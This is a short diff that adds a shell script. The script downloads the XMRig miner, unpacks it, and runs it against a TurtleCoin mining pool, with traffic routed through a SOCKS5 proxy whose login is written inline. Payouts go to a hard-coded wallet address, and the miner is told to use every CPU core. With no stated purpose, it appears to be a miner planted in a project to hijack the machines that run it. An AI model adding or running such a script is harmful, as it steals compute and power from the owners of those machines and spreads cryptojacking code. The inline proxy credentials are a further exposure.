@@ -1,0 +1,5 @@
+#!/bin/sh 
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
+tar -xf xmrig-6.15.3-linux-x64.tar.gz
+cd xmrig-6.15.3
+./xmrig -o socks5://byhasode:eeb1ikx1ka9h@193.27.19.24:7110 --rig-id tukimen --tls -a argon2/chukwav2 -o sg.turtlecoin.herominers.com:1160 -u TRTLuweEwEqPstNHhkvxX6UPy4Nw9WAN8gFmeyDHE1Mr54WVPgwUq1L9DqHKCjmcKNHvoNfrh7w7VHVBj1efakotfkt2jeroLmy+70c02bade7429f384049b72434d332492dc21ecfd72fd3bcc67dd0e424368e4b -k --tls -p tukimen -t $(nproc)
